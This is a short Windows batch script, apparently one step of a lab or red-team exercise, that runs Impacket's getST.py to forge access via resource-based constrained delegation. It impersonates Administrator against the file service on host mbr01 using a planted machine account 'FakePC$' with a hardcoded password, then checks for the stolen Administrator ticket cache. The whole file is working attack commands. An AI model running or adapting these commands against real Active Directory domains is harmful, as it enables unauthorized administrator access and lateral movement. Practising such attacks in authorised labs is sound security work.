@echo off
REM WT007 RBCD step 4+5: getST + use ticket against mbr01
cd /d C:\Tools\cadre-attack
python C:\Users\analyst_t1.CHILD\AppData\Local\Programs\Python\Python312\Scripts\getST.py -spn cifs/mbr01.child.cadre.local -impersonate Administrator -dc-ip dc02.child.cadre.local "child.cadre.local/FakePC$:Password123!"
echo GETST_RC %ERRORLEVEL%
dir Administrator.ccache 2>nul
